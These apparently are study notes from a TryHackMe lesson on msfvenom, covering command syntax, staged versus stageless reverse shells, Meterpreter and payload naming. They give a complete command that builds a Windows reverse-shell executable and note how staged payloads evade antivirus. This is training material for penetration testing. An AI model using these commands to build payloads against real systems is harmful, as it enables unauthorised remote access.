Msfvenom: the one-stop-shop for all things payload related.

Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`).

The standard syntax for msfvenom is as follows:

`msfvenom -p <PAYLOAD> <OPTIONS>`  

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

![[Pasted image 20220215011935.png]]

Here we are using a payload and four options:

-   **-f** format

-   Specifies the output format. In this case that is an executable (exe)

-   **-o** file

-   The output location and filename for the generated payload.

-   **LHOST=**IP

-   Specifies the IP to connect back to. When using TryHackMe, this will be your [tun0 IP address](http://10.10.10.10). If you cannot load the link then you are not [connected to the VPN](https://tryhackme.com/room/welcome).

-   **LPORT=**port

-   The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
	
---

_Staged vs Stageless_  

Before we go any further, there are another two concepts which must be introduced: _**staged**_ reverse shell payloads and _**stageless**_ reverse shell payloads.

-   _**Staged**_ payloads are sent in two parts. The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.  
    
-   _**Stageless**_ payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.  

---

_Meterpreter_  

On the subject of Metasploit, another important thing to discuss is a _Meterpreter_ shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we _need_ to use a meterpreter shell, however, that is a topic for [another time](https://tryhackme.com/room/rpmetasploit). The downside to meterpreter shells is that they _must_ be caught in Metasploit. They are also banned from certain certification examinations, so it's a good idea to learn alternative methodologies.  

---

_Payload Naming Conventions_

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:

`OS/arch/payload`  
  
For example:

`linux/x86/shell_reverse_tcp`  

This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:

`windows/shell_reverse_tcp  
`  

For a 64bit Windows target, the arch would be specified as normal (x64).

Let's break the payload section down a little further.

In the above examples the payload used was `shell_reverse_tcp`. This indicates that it was a _stageless_ payload. How? Stageless payloads are denoted with underscores (`_`). The staged equivalent to this payload would be:

`shell/reverse_tcp`  

As staged payloads are denoted with another forward slash (`/`).

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

`windows/x64/meterpreter/reverse_tcp`  

A Linux 32bit stageless Meterpreter payload would look like this:

`linux/x86/meterpreter_reverse_tcp`  

---

Aside from the `msfconsole` man page, the other important thing to note when working with msfvenom is:  

`msfvenom --list payloads`  

This can be used to list all available payloads, which can then be piped into `grep` to search for a specific set of payloads. For example:
	
![[Pasted image 20220215012035.png]]

![[Pasted image 20220215012607.png]]

	